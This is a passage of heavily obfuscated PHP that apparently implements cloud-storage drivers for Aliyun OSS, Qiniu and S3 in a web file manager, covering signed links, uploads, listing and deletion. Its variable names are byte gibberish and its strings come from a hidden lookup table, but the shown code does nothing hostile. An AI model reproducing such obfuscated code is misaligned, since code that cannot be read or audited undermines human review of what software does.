-1) { $à›ÎùÒ± = array(); } else { if ($Ô—œËĞ´ === !1) { $‹é­íë = $this->size($ËëÀ¹¾Ó); } else { $‹é­íë = $µºè‘‡Æ + $Ô—œËĞ´ - 1; } $à›ÎùÒ± = array(OSS\OssClient::OSS_RANGE => "{$µºè‘‡Æ}\55{$‹é­íë}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($ËëÀ¹¾Ó), $à›ÎùÒ±); } catch (OSS\Core\OssException $®øµ¬Ö) { think_exception($®øµ¬Ö->getMessage()); return !1; } } private function trafficLimit($¥ÎöáÚŸ, $“Ü÷şŞ = array()) { $Ğ¢Ê =& $_SERVER[”ú…±Ú¥]; if ($¥ÎöáÚŸ == $Ğ¢Ê[1424] && $this->isUploadServer() || $¥ÎöáÚŸ == $Ğ¢Ê[109] && $this->isFileOutServer()) { return $“Ü÷şŞ; } $¶†¥õèï = floatval($GLOBALS[$Ğ¢Ê[6]][$Ğ¢Ê[89]][$Ğ¢Ê[107]][$¥ÎöáÚŸ]) * 1024 * 1024 * 8; if (!$¶†¥õèï) { return $“Ü÷şŞ; } $¶†¥õèï = $¶†¥õèï < 819200 ? 819200 : ($¶†¥õèï > 838860800 ? 838860800 : $¶†¥õèï); $“Ü÷şŞ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($¶†¥õèï); return $“Ü÷şŞ; } public function link($ÜÌÀÛş, $›«ûİı = array()) { $†ƒ¹¶ø =& $_SERVER[”ú…±Ú¥]; if (!$this->exist($ÜÌÀÛş) || $this->isFolder($ÜÌÀÛş)) { return !1; } try { $›«ûİı = $this->trafficLimit($†ƒ¹¶ø[109], $›«ûİı); $™šà¥Å = $this->client->signUrl($this->bucket, $this->pathEncode($ÜÌÀÛş), 3600 * 12, $†ƒ¹¶ø[240], $›«ûİı); return $this->getCdnLink($™šà¥Å); } catch (OSS\Core\OssException $‡şÑ“ÔÁ) { return !1; } } public function fileOut($‘×½šãÍ, $÷µÓ›°Ü = false, $˜‰”å™ù = false, $È÷¨ÍŸÌ = '') { $ÚÇßÊÂß =& $_SERVER[”ú…±Ú¥]; if ($this->isFileOutServer()) { return $this->fileOutServer($‘×½šãÍ, $÷µÓ›°Ü, $˜‰”å™ù, $È÷¨ÍŸÌ); } if (!$˜‰”å™ù) { $˜‰”å™ù = $this->pathThis($‘×½šãÍ); } $˜‰”å™ù = rawurlencode($˜‰”å™ù); $Ò£µÕ = get_file_mime(get_path_ext($˜‰”å™ù)); if ($Ò£µÕ == $ÚÇßÊÂß[227]) { return parent::fileOut($‘×½šãÍ, $÷µÓ›°Ü, $˜‰”å™ù, $È÷¨ÍŸÌ); } $÷µÓ›°Ü = $÷µÓ›°Ü ? $ÚÇßÊÂß[1435] : $ÚÇßÊÂß[1436]; $° óâõ  = array(OSS\OssClient::OSS_SUB_RESOURCE => $ÚÇßÊÂß[1437] . rawurlencode("{$÷µÓ›°Ü}\x3b\146\x69\x6c\x65\x6e\x61\155\145\75{$˜‰”å™ù}")); $° óâõ [OSS\OssClient::OSS_SUB_RESOURCE] .= $ÚÇßÊÂß[1438] . rawurlencode($Ò£µÕ); $ü­õ½å = $this->link($‘×½šãÍ, $° óâõ ); $this->fileOutLink($ü­õ½å); } public function fileOutServer($Áš›Ù°É, $¨©À¾¡ = false, $¬Š½ÂÀ = false, $ÍøÂÈ”ƒ = '') { parent::fileOut($Áš›Ù°É, $¨©À¾¡, $¬Š½ÂÀ, $ÍøÂÈ”ƒ); } public function fileOutImage($ÄŞ€ÏùÀ, $ÏÜ§ÏòÑ = 250) { if ($this->size($ÄŞ€ÏùÀ) > 1024 * 1024 * 20) { return $this->fileOutImageServer($ÄŞ€ÏùÀ, $ÏÜ§ÏòÑ); } $ª‘Î¨Û = array(OSS\OssClient::OSS_PROCESS => $_SERVER[”ú…±Ú¥][1439] . $ÏÜ§ÏòÑ); $ç‡ŸË = $this->link($ÄŞ€ÏùÀ, $ª‘Î¨Û); $this->fileOutLink($ç‡ŸË); } public function fileOutImageServer($öÍø±¿ß, $¡®ö¨“¿ = 250) { parent::fileOutImage($öÍø±¿ß, $¡®ö¨“¿); } public function fileOutLink($¡îúŒì„) { $Û°¿’Ñâ =& $_SERVER[”ú…±Ú¥]; if (!$this->isCdnHost() && substr($¡îúŒì„, 0, 7) == $Û°¿’Ñâ[1360]) { $¡îúŒì„ = $Û°¿’Ñâ[1361] . substr($¡îúŒì„, 7); } header($Û°¿’Ñâ[161] . $¡îúŒì„); die; } public function hashMd5($¥ÕÕØÂÕ, $¼âÙÕüê = '') { $¿âÏø‚ô =& $_SERVER[”ú…±Ú¥]; $å¿¯àû = $this->_objectMeta($¥ÕÕØÂÕ); if (!$å¿¯àû) { return $¿âÏø‚ô[12]; } if (!isset($å¿¯àû[$¿âÏø‚ô[1414]]) && !empty($¼âÙÕüê)) { $¾Û´›ø³ = $this->updateObjMeta($¥ÕÕØÂÕ, array($¿âÏø‚ô[1414] => $¼âÙÕüê)); $å¿¯àû[$¿âÏø‚ô[1414]] = $¾Û´›ø³ ? $¼âÙÕüê : $¿âÏø‚ô[12]; } return isset($å¿¯àû[$¿âÏø‚ô[1414]]) ? strtolower($å¿¯àû[$¿âÏø‚ô[1414]]) : $¿âÏø‚ô[12]; } public function size($éÜ¼—úû) { $Ñ÷¡õ´Œ = $this->objectMeta($éÜ¼—úû); return $Ñ÷¡õ´Œ ? $Ñ÷¡õ´Œ[$_SERVER[”ú…±Ú¥][76]] : 0; } public function info($Ş¢‘Î”ã) { if ($this->isFolder($Ş¢‘Î”ã)) { return $this->folderInfo($Ş¢‘Î”ã); } else { if ($this->isFile($Ş¢‘Î”ã)) { return $this->fileInfo($Ş¢‘Î”ã); } } return !1; } public function exist($¯ù¯ƒÙÃ) { return $this->isFile($¯ù¯ƒÙÃ) || $this->isFolder($¯ù¯ƒÙÃ); } public function isFile($Íàİ²‘Ê) { return !$this->isFolder($Íàİ²‘Ê) && $this->objectMeta($Íàİ²‘Ê); } public function isFolder($¸³êÙ£³) { return $this->cacheMethod($_SERVER[”ú…±Ú¥][165], $¸³êÙ£³); } protected function objectMeta($“éåó™Û) { return $this->cacheMethod($_SERVER[”ú…±Ú¥][167], $“éåó™Û); } protected function _objectMeta($İ”·’†æ) { $§õÒ³øí =& $_SERVER[”ú…±Ú¥]; try { $‘ûËäŞê = $this->client->getObjectMeta($this->bucket, $this->pathEncode($İ”·’†æ)); } catch (OSS\Core\OssException $Ñ©ô³“ı) { $‘ûËäŞê = !1; } if ($‘ûËäŞê) { $‘ûËäŞê[$§õÒ³øí[76]] = intval($‘ûËäŞê[$§õÒ³øí[1412]]); } return $‘ûËäŞê; } protected function _isFolder($õ ä»íš) { $ù™£‚µ =& $_SERVER[”ú…±Ú¥]; if ($õ ä»íš == $ù™£‚µ[12] || $õ ä»íš == $ù™£‚µ[8]) { return !0; } $š££öë = array($ù™£‚µ[1408] => $ù™£‚µ[8], $ù™£‚µ[1409] => rtrim($õ ä»íš, $ù™£‚µ[8]) . $ù™£‚µ[8], $ù™£‚µ[1410] => 1, $ù™£‚µ[1411] => $ù™£‚µ[12]); $ŒÕ¢  = $this->client->listObjects($this->bucket, $š££öë); if ($ŒÕ¢ ->getObjectList() || $ŒÕ¢ ->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($°§åíÙ¡) { parent::__construct(); require_once SDK_DIR . $_SERVER[”ú…±Ú¥][1440]; $this->_init($°§åíÙ¡); } public function _init($—©“¥¾Ñ) { $¿Äåğ´œ =& $_SERVER[”ú…±Ú¥]; $this->config = $—©“¥¾Ñ; foreach ($—©“¥¾Ñ as $§âÏÔ°¥ => $ªÎ²²ÁÇ) { if (isset($this->{$§âÏÔ°¥})) { $this->{$§âÏÔ°¥} = $ªÎ²²ÁÇ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($¿Äåğ´œ[1441] . LNG($¿Äåğ´œ[1399])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($±Ó»ò‰, $¢¿Õ¬«• = '', $øÕ²ğèò = REPEAT_RENAME) { if ($this->setContent($±Ó»ò‰, $¢¿Õ¬«•)) { return $this->getPathOuter($±Ó»ò‰); } return !1; } public function mkdir($ÑÉÚˆ, $¥üÆ„²¤ = REPEAT_SKIP) { $ì‰¸½Á÷ =& $_SERVER[”ú…±Ú¥]; $åæºµ«É = trim($ÑÉÚˆ, $ì‰¸½Á÷[8]); if ($this->_isFolder($åæºµ«É)) { return $this->getPathOuter($åæºµ«É); } $ÑÉÚˆ = $åæºµ«É . $ì‰¸½Á÷[8]; $Ø˜ŸÈ¶â = get_path_this($åæºµ«É); $£«¶²Ê« = $ÑÉÚˆ . $Ø˜ŸÈ¶â; if (!$this->mkfile($£«¶²Ê«)) { return !1; } if (!$this->moveFile($£«¶²Ê«, $ÑÉÚˆ)) { $this->delFile($£«¶²Ê«); return !1; } return $this->getPathOuter($åæºµ«É); } public function copyFile($™Ê÷¹°, $½ÆÃ¯Ş ) { $’éêàøÈ = $this->bucketManager->copy($this->bucket, $™Ê÷¹°, $this->bucket, $½ÆÃ¯Ş , !0); return $’éêàøÈ ? !1 : $this->getPathOuter($½ÆÃ¯Ş ); } public function moveFile($¶ÈÑ‹Ûù, $À¡Øß¤Ê) { $àşû¬»² = $this->bucketManager->move($this->bucket, $¶ÈÑ‹Ûù, $this->bucket, $À¡Øß¤Ê, !0); return $àşû¬»² ? !1 : $this->getPathOuter($À¡Øß¤Ê); } public function delFile($æã­À»Ñ) { if (!$this->exist($æã­À»Ñ)) { return !0; } $Êì¹ŞÉÒ = $this->bucketManager->delete($this->bucket, $æã­À»Ñ); return $Êì¹ŞÉÒ ? !1 : !0; } public function delFolder($Äƒ‚İ‚Ó) { $ÆÙ±”ª² =& $_SERVER[”ú…±Ú¥]; if (!$this->exist($Äƒ‚İ‚Ó)) { return !0; } $this->listItemCache = !1; $ø·‘Ç† = $this->fileList($Äƒ‚İ‚Ó); $this->listItemCache = !0; $úî¸·¯¹ = trim($Äƒ‚İ‚Ó, $ÆÙ±”ª²[8]) . $ÆÙ±”ª²[8]; if (!empty($Äƒ‚İ‚Ó) && $Äƒ‚İ‚Ó !== $ÆÙ±”ª²[208] && !in_array($úî¸·¯¹, $ø·‘Ç†[$ÆÙ±”ª²[82]])) { $ø·‘Ç†[$ÆÙ±”ª²[82]][] = $úî¸·¯¹; } $ŞÉ…íä° = $this->delByBatch($ø·‘Ç†[$ÆÙ±”ª²[83]]); if (!$ŞÉ…íä°) { return !1; } $ŞÉ…íä° = $this->delByBatch($ø·‘Ç†[$ÆÙ±”ª²[82]]); if (!$ŞÉ…íä°) { return !1; } return $this->delFile($úî¸·¯¹); } private function delByBatch($×™ÈŸ¿) { foreach (array_chunk($×™ÈŸ¿, 1000) as $ì›­—¥¹) { $ş¸°²…µ = $this->bucketManager->buildBatchDelete($this->bucket, $ì›­—¥¹); list($ ¼÷®¢Õ, $ş·ªä¶») = $this->bucketManager->batch($ş¸°²…µ); if ($ş·ªä¶») { return !1; } } return !0; } public function rename($¼Òæõ¸, $®ÒÄàÔÆ) { return $this->renameObject($¼Òæõ¸, $®ÒÄàÔÆ); } public function fileInfo($‰ß¨è¹í, $ÁÈÂ = false, $‹¦¶µ¤¥ = array()) { $‰›©¢‰µ =& $_SERVER[”ú…±Ú¥]; $š³üÒ¾Ğ = array($‰›©¢‰µ[32] => $this->pathThis($‰ß¨è¹í), $‰›©¢‰µ[84] => $this->getPathOuter($‰›©¢‰µ[8] . $‰ß¨è¹í), $‰›©¢‰µ[33] => $‰›©¢‰µ[210], $‰›©¢‰µ[76] => isset($‹¦¶µ¤¥[$‰›©¢‰µ[1442]]) ? $‹¦¶µ¤¥[$‰›©¢‰µ[1442]] : 0, $‰›©¢‰µ[174] => $this->ext($‰ß¨è¹í)); if ($ÁÈÂ) { return $š³üÒ¾Ğ; } $š³üÒ¾Ğ[$‰›©¢‰µ[211]] = $š³üÒ¾Ğ[$‰›©¢‰µ[85]] = 0; $š³üÒ¾Ğ[$‰›©¢‰µ[212]] = $š³üÒ¾Ğ[$‰›©¢‰µ[213]] = !0; if (empty($‹¦¶µ¤¥)) { $‹¦¶µ¤¥ = $this->objectMeta($‰ß¨è¹í); if (!$‹¦¶µ¤¥) { return $š³üÒ¾Ğ; } } if (isset($‹¦¶µ¤¥[$‰›©¢‰µ[1443]])) { $š³üÒ¾Ğ[$‰›©¢‰µ[85]] = substr($‹¦¶µ¤¥[$‰›©¢‰µ[1443]] . $‰›©¢‰µ[12], 0, 10); } if (isset($‹¦¶µ¤¥[$‰›©¢‰µ[1442]])) { $š³üÒ¾Ğ[$‰›©¢‰µ[76]] = $‹¦¶µ¤¥[$‰›©¢‰µ[1442]]; } return $š³üÒ¾Ğ; } public function folderInfo($Œˆ¿Ï‘·, $–Æ¬æ¦¶ = false) { $˜ãóàº =& $_SERVER[”ú…±Ú¥]; $‹«ş‡‘ã = array($˜ãóàº[32] => $this->pathThis($Œˆ¿Ï‘·), $˜ãóàº[84] => $this->getPathOuter($˜ãóàº[8] . $Œˆ¿Ï‘·), $˜ãóàº[33] => $˜ãóàº[75]); if ($–Æ¬æ¦¶) { return $‹«ş‡‘ã; } $‹«ş‡‘ã[$˜ãóàº[211]] = $‹«ş‡‘ã[$˜ãóàº[85]] = 0; $‹«ş‡‘ã[$˜ãóàº[212]] = $‹«ş‡‘ã[$˜ãóàº[213]] = !0; $Œˆ¿Ï‘· = rtrim($Œˆ¿Ï‘·, $˜ãóàº[8]) . $˜ãóàº[8]; $û§š¢ıÍ = $this->objectMeta($Œˆ¿Ï‘·); if (isset($û§š¢ıÍ[$˜ãóàº[1443]])) { $‹«ş‡‘ã[$˜ãóàº[85]] = substr($û§š¢ıÍ[$˜ãóàº[1443]] . $˜ãóàº[12], 0, 10); } return $‹«ş‡‘ã; } public function listPath($ÒıÆŒ÷ú, $¡†ë†»à = false) { $²¯µãñÖ =& $_SERVER[”ú…±Ú¥]; $á¸¸™¦Ã = $this->fileList($ÒıÆŒ÷ú, $²¯µãñÖ[8], !0); foreach ($á¸¸™¦Ã[$²¯µãñÖ[82]] as $ÕŒ½„ù => $©àñ¥Ùá) { $á¸¸™¦Ã[$²¯µãñÖ[82]][$ÕŒ½„ù] = $this->folderInfo($©àñ¥Ùá, $¡†ë†»à); } foreach ($á¸¸™¦Ã[$²¯µãñÖ[83]] as $ÕŒ½„ù => $©àñ¥Ùá) { $á¸¸™¦Ã[$²¯µãñÖ[83]][$ÕŒ½„ù] = $this->fileInfo($©àñ¥Ùá[$²¯µãñÖ[94]], $¡†ë†»à, $©àñ¥Ùá); } return $á¸¸™¦Ã; } public function has($‰†’½å, $©§³Àğ¶ = false, $ÆŠ¾Ìµ• = true) { $¹Ğ÷êúê =& $_SERVER[”ú…±Ú¥]; $‰†’½å = trim($‰†’½å, $¹Ğ÷êúê[8]); $û¡¸âóó = empty($‰†’½å) && $‰†’½å !== $¹Ğ÷êúê[208] ? $¹Ğ÷êúê[12] : $‰†’½å . $¹Ğ÷êúê[8]; $ü¸¸…·š = $¹Ğ÷êúê[12]; $°«ÒâÎ = 500; $œÀï”İ‚ = $¹Ğ÷êúê[8]; $Æ×¦†œ¡ = $ŸÚÚÚ’Ç = 0; while (!0) { check_abort(); list($Şğµ§–Ü, $¢¿¼¸) = $this->bucketManager->listFiles($this->bucket, $û¡¸âóó, $ü¸¸…·š, $°«ÒâÎ, $œÀï”İ‚); if ($¢¿¼¸) { break; } $ü¸¸…·š = array_key_exists($¹Ğ÷êúê[1411], $Şğµ§–Ü) ? $ü¸¸…·š = $Şğµ§–Ü[$¹Ğ÷êúê[1444]] : $¹Ğ÷êúê[12]; if ($©§³Àğ¶) { if (!empty($Şğµ§–Ü[$¹Ğ÷êúê[1445]])) { $Æ×¦†œ¡ += count($Şğµ§–Ü[$¹Ğ÷êúê[1445]]); } if (!empty($Şğµ§–Ü[$¹Ğ÷êúê[1446]])) { $ŸÚÚÚ’Ç += count($Şğµ§–Ü[$¹Ğ÷êúê[1446]]); } if ($ü¸¸…·š === $¹Ğ÷êúê[12]) { break; } continue; } if ($ÆŠ¾Ìµ•) { if (!empty($Şğµ§–Ü[$¹Ğ÷êúê[1445]])) { return !0; } } else { if (!empty($Şğµ§–Ü[$¹Ğ÷êúê[1446]])) { return !0; } } if ($ü¸¸…·š === $¹Ğ÷êúê[12]) { break; } } if ($©§³Àğ¶) { return array($¹Ğ÷êúê[217] => $Æ×¦†œ¡, $¹Ğ÷êúê[218] => $ŸÚÚÚ’Ç); } return !1; } public function listAll($öéÅŒğÇ) { $¥Ú“½úÛ =& $_SERVER[”ú…±Ú¥]; $İ˜ÉÕŠ = $this->fileList($öéÅŒğÇ, $¥Ú“½úÛ[12], !0); $¨»©ßë¦ = array_to_keyvalue($İ˜ÉÕŠ[$¥Ú“½úÛ[83]], $¥Ú“½úÛ[32]); foreach ($İ˜ÉÕŠ[$¥Ú“½úÛ[82]] as $ˆòµğ£é) { if (is_string($ˆòµğ£é)) { $¨»©ßë¦[$ˆòµğ£é] = array($¥Ú“½úÛ[76] => 0); } } return $this->listAllFiles($öéÅŒğÇ, $¨»©ßë¦); } private function fileList($ŞŸÄåÉ, $‘Ÿü»Úª = '', $Ñ­±¬Ô = 0) { $Óıš‰Î¾ =& $_SERVER[”ú…±Ú¥]; $ŞŸÄåÉ = trim($ŞŸÄåÉ, $Óıš‰Î¾[8]); $Şù®™‘æ = empty($ŞŸÄåÉ) && $ŞŸÄåÉ !== $Óıš‰Î¾[208] ? $Óıš‰Î¾[12] : $ŞŸÄåÉ . $Óıš‰Î¾[8]; $éãÈ–ü÷ = $Óıš‰Î¾[12]; $¿ÖÖ¹©” = 1000; $™¡†·À = $÷ß­ÔÍ = array(); while (!0) { check_abort(); list($“ŠÑöªÛ, $ÜâËœ»­) = $this->bucketManager->listFiles($this->bucket, $Şù®™‘æ, $éãÈ–ü÷, $¿ÖÖ¹©”, $‘Ÿü»Úª); if ($ÜâËœ»­) { break; } $éãÈ–ü÷ = array_key_exists($Óıš‰Î¾[1411], $“ŠÑöªÛ) ? $éãÈ–ü÷ = $“ŠÑöªÛ[$Óıš‰Î¾[1444]] : $Óıš‰Î¾[12]; $ÔõŒãò¡ = isset($“ŠÑöªÛ[$Óıš‰Î¾[1445]]) ? $“ŠÑöªÛ[$Óıš‰Î¾[1445]] : array(); $¿òïÁ®Î = isset($“ŠÑöªÛ[$Óıš‰Î¾[1446]]) ? $“ŠÑöªÛ[$Óıš‰Î¾[1446]] : array(); foreach ($ÔõŒãò¡ as $ã²Ğª) { if ($ã²Ğª[$Óıš‰Î¾[94]] == $Şù®™‘æ) { continue; } $õÉáÃ÷ = $ã²Ğª[$Óıš‰Î¾[94]]; $™éÕñÊ¬ = $ã²Ğª[$Óıš‰Î¾[1442]]; $ã²Ğª[$Óıš‰Î¾[76]] = $™éÕñÊ¬; $óäúıÏå = $™éÕñÊ¬ == 0 && substr($õÉáÃ÷, strlen($õÉáÃ÷) - 1, 1) == $Óıš‰Î¾[8] ? !0 : !1; $this->cacheMethodInfoSet($õÉáÃ÷, $óäúıÏå, $ã²Ğª); if ($óäúıÏå) { $™¡†·À[] = $õÉáÃ÷; continue; } $÷ß­ÔÍ[] = $Ñ­±¬Ô ? $ã²Ğª : $õÉáÃ÷; } foreach ($¿òïÁ®Î as $õÉáÃ÷) { if ($õÉáÃ÷ == $Şù®™‘æ) { continue; } $™¡†·À[] = $õÉáÃ÷; $this->cacheMethodInfoSet($õÉáÃ÷, !0); } if ($éãÈ–ü÷ === $Óıš‰Î¾[12]) { break; } } $this->cacheMethodInfoSet($ŞŸÄåÉ, !0); return array($Óıš‰Î¾[82] => $™¡†·À, $Óıš‰Î¾[83] => $÷ß­ÔÍ); } public function canRead($ÇÅ‰Ïàî) { return $this->exist($ÇÅ‰Ïàî) ? !0 : !1; } public function canWrite($ğÚŒ‹³) { return $this->exist($ğÚŒ‹³) ? !0 : !1; } public function getContent($İó®Û¿ü) { return $this->fileSubstr($İó®Û¿ü, 0, -1); } public function setContent($“²¸Ë· , $âÉ®ÁØã = '') { $Ï‡÷¶›® = $this->tempFile($this->pathThis($“²¸Ë· )); file_put_contents($Ï‡÷¶›®, $âÉ®ÁØã); if ($this->upload($“²¸Ë· , $Ï‡÷¶›®)) { $this->tempFileRemve($Ï‡÷¶›®); return !0; } return !1; } public function refreshUrls($¶ê«íÙÅ) { $¦ë›úˆ =& $_SERVER[”ú…±Ú¥]; $„ëªíÁ› = array(); if (is_array($¶ê«íÙÅ)) { foreach ($¶ê«íÙÅ as $Ÿ½­Àê•) { $„ëªíÁ›[] = $this->link($Ÿ½­Àê•); } } else { $„ëªíÁ›[] = $this->link($¶ê«íÙÅ); } $ÊÌ‡«Š = new Qiniu\Cdn\CdnManager($this->auth); list($ÌÒõÆøÀ, $ŸÈó«ò©) = $ÊÌ‡«Š->refreshUrls($„ëªíÁ›); if ($ŸÈó«ò©) { return !1; } return $ÌÒõÆøÀ[$¦ë›úˆ[1211]] == $¦ë›úˆ[791] ? !0 : !1; } public function fileSubstr($¼¨¢ëé, $—Å†õªÇ, $‰ÆÑ»éì) { $ñŒÑ–Ï =& $_SERVER[”ú…±Ú¥]; if (!($¿ˆìØ¾¿ = $this->link($¼¨¢ëé))) { return !1; } $…øÜ—¬— = !1; if ($‰ÆÑ»éì > 0) { $¦¸Áéßã = $—Å†õªÇ + $‰ÆÑ»éì - 1; $…øÜ—¬— = array($ñŒÑ–Ï[1447] . $—Å†õªÇ . $ñŒÑ–Ï[424] . $¦¸Áéßã); } $ä²”ßæ£ = url_request($¿ˆìØ¾¿, $ñŒÑ–Ï[240], !1, $…øÜ—¬—); return $ä²”ßæ£[$ñŒÑ–Ï[782]] ? $ä²”ßæ£[$ñŒÑ–Ï[1231]] : !1; } public function upload($’åÛÜØÚ, $Ôã”‡ĞÌ, $àÚ¥çá = false, $âäïı‡å = REPEAT_REPLACE) { $ï£ûÏ‹© = new Qiniu\Storage\UploadManager(); $÷¿†®¼š = $this->auth->uploadToken($this->bucket, $’åÛÜØÚ); $çĞšŞ±‚ = get_file_mime(get_path_ext($Ôã”‡ĞÌ)); list($˜ƒß÷Ê¾, $ö¿¢ÊóÖ) = $ï£ûÏ‹©->putFile($÷¿†®¼š, $’åÛÜØÚ, $Ôã”‡ĞÌ, null, $çĞšŞ±‚); return $ö¿¢ÊóÖ ? !1 : $this->getPathOuter($’åÛÜØÚ); } public function uploadFormData($ä¬ìÇ¡™, $‘¨”¸• = 3600) { return $this->uploadToken($ä¬ìÇ¡™, $‘¨”¸•); } public function multiUploadFormData($ÅÍİ«¼°, $îúªÇÆÇ = 3600) { return $this->uploadToken($ÅÍİ«¼°, $îúªÇÆÇ); } private function uploadToken($äü±Õ³á, $°…âÒ…ı = 3600) { $œºŠ¤ËÒ =& $_SERVER[”ú…±Ú¥]; $¨†®¨Û„ = $°…âÒ…ı; $ç‹¿¯¼æ = array($œºŠ¤ËÒ[1448] => $œºŠ¤ËÒ[1449]); $Ê¶Å¿Õå = $äü±Õ³á; $Óªúá½Ò = $this->auth->uploadToken($this->bucket, $Ê¶Å¿Õå, $¨†®¨Û„, $ç‹¿¯¼æ, !0); $ü§†ƒö¯ = empty($this->region) || $this->region == $œºŠ¤ËÒ[1450] ? $œºŠ¤ËÒ[12] : $œºŠ¤ËÒ[424] . $this->region; $Ìßª¢ª = http_type() . "\x3a\x2f\x2f\x75\x70\154\x6f\x61\x64{$ü§†ƒö¯}\x2e\161\x69\x6e\151\165\x70\56\x63\x6f\x6d\57"; return array($œºŠ¤ËÒ[1451] => $Óªúá½Ò, $œºŠ¤ËÒ[1452] => $Ìßª¢ª); } public function download($ü¾ÀÚ, $‰è´µøå) { $ †À†²¨ = IO::getPathInner(IO::mkfile($‰è´µøå)); if (!($‹Ïæ«ë = $this->link($ü¾ÀÚ))) { return !1; } $šŸÙº÷ = 0; $×öàğÂ€ = 1024 * 200; $šıªñŒ‘ = fopen($ †À†²¨, $_SERVER[”ú…±Ú¥][1453]); while (!0) { $ø…¢Œìà = $this->fileSubstr($ü¾ÀÚ, $šŸÙº÷, $×öàğÂ€); if ($ø…¢Œìà === !1) { return !1; } fwrite($šıªñŒ‘, $ø…¢Œìà); $šŸÙº÷ += $×öàğÂ€; if (strlen($ø…¢Œìà) < $×öàğÂ€) { break; } } fclose($šıªñŒ‘); return $‰è´µøå; } public function link($ü»—«¹¼, $¡¡§Ş†ğ = '') { if (!$this->isFile($ü»—«¹¼)) { return !1; } $ˆ£œÒ¼º = $this->getHost() . $_SERVER[”ú…±Ú¥][8] . $this->pathEncode($ü»—«¹¼) . $¡¡§Ş†ğ; return $this->auth->privateDownloadUrl($ˆ£œÒ¼º, 3600 * 12); } public function fileOut($Ÿ‹ö†´, $´‡Úã´Ô = false, $®Š¨…æ¾ = false, $ÈËş£½¼ = '') { $ß“…‹ğ¨ =& $_SERVER[”ú…±Ú¥]; if ($this->isFileOutServer()) { return $this->fileOutServer($Ÿ‹ö†´, $´‡Úã´Ô, $®Š¨…æ¾, $ÈËş£½¼); } if (!$®Š¨…æ¾) { $®Š¨…æ¾ = $this->pathThis($Ÿ‹ö†´); } $Ò“Î†Çµ = $´‡Úã´Ô ? $ß“…‹ğ¨[1454] . rawurlencode($®Š¨…æ¾) : $ß“…‹ğ¨[12]; $Ö¥Ç­›È = $this->link($Ÿ‹ö†´, $Ò“Î†Çµ); $this->fileOutLink($Ö¥Ç­›È); } public function fileOutServer($ŞÂŒ©¹, $…î…œËª = false, $¬·ğÚÁÓ = false, $›¥ˆ­å = '') { parent::fileOut($ŞÂŒ©¹, $…î…œËª, $¬·ğÚÁÓ, $›¥ˆ­å); } public function fileOutImage($ıäÅìÁ, $‡¬ß¶àª = 250) { $øÒÏ©ğğ = $this->link($ıäÅìÁ, $_SERVER[”ú…±Ú¥][1455] . $‡¬ß¶àª); $this->fileOutLink($øÒÏ©ğğ); } public function fileOutImageServer($éÚñÖÕ, $ˆ¼¶¨ƒĞ = 250) { parent::fileOutImage($éÚñÖÕ, $ˆ¼¶¨ƒĞ); } public function hashMd5($ä‘Ñş¢Ø) { $»šµ·ö =& $_SERVER[”ú…±Ú¥]; $õ‰»Ğª± = $this->objectMeta($ä‘Ñş¢Ø); return isset($õ‰»Ğª±[$»šµ·ö[222]]) ? $õ‰»Ğª±[$»šµ·ö[222]] : !1; $Á˜§·ñ¢ = $this->link($ä‘Ñş¢Ø, $»šµ·ö[1456]); } public function size($ë”„ÒÅÚ) { $ÍÄü«ô = $this->objectMeta($ë”„ÒÅÚ); return $ÍÄü«ô ? $ÍÄü«ô[$_SERVER[”ú…±Ú¥][76]] : 0; } public function info($¨Ö™¬ß) { if ($this->isFolder($¨Ö™¬ß)) { return $this->folderInfo($¨Ö™¬ß); } else { if ($this->isFile($¨Ö™¬ß)) { return $this->fileInfo($¨Ö™¬ß); } } return !1; } public function exist($´íãÀÓî) { return $this->isFile($´íãÀÓî) || $this->isFolder($´íãÀÓî); } public function isFile($äİ«ÓÙ) { return !$this->isFolder($äİ«ÓÙ) && $this->objectMeta($äİ«ÓÙ); } public function isFolder($©‰¢ªõ) { return $this->cacheMethod($_SERVER[”ú…±Ú¥][165], $©‰¢ªõ); } protected function objectMeta($…µ‡åñ) { return $this->cacheMethod($_SERVER[”ú…±Ú¥][167], $…µ‡åñ); } protected function _objectMeta($ê¹˜ß“±) { $Ô£”š¹Ü =& $_SERVER[”ú…±Ú¥]; list($‚şŒÂ, $…ã„äÙö) = $this->bucketManager->stat($this->bucket, $ê¹˜ß“±); if ($‚şŒÂ) { $‚şŒÂ[$Ô£”š¹Ü[76]] = intval($‚şŒÂ[$Ô£”š¹Ü[1442]]); } return $‚şŒÂ; } protected function _isFolder($Åî•æªŞ) { $ÓÛå·äİ =& $_SERVER[”ú…±Ú¥]; if ($Åî•æªŞ == $ÓÛå·äİ[12] || $Åî•æªŞ == $ÓÛå·äİ[8]) { return !0; } list($¸¶ò×åİ, $×¸›‚Ûë) = $this->bucketManager->listFiles($this->bucket, trim($Åî•æªŞ, $ÓÛå·äİ[8]) . $ÓÛå·äİ[8], $ÓÛå·äİ[12], 1, $ÓÛå·äİ[8]); return !empty($¸¶ò×åİ[$ÓÛå·äİ[1445]]) || !empty($¸¶ò×åİ[$ÓÛå·äİ[1446]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($å˜ğÁÈ) { parent::__construct($å˜ğÁÈ); } public function uploadFormData($˜ğš¤µ¯, $€÷Üêİ¢ = 3600) { $â™ßÆó =& $_SERVER[”ú…±Ú¥]; $‡š¦Ë¼« = $â™ßÆó[209]; $ÛåŒ³Ö = $â™ßÆó[247]; $¡÷¤¦ê = $â™ßÆó[62]; $Ë»òÛ = gmdate($â™ßÆó[248]); $Œ§Û½ÅÂ = gmdate($â™ßÆó[249]); $ÓÃ¬”•ˆ = $â™ßÆó[250]; $ËïÌôØ° = $€÷Üêİ¢ . $â™ßÆó[12]; $“éŞ© = $â™ßÆó[251]; $¥éò«ªá = array($this->accessKey, $Œ§Û½ÅÂ, $this->region, $¡÷¤¦ê, $ÓÃ¬”•ˆ); 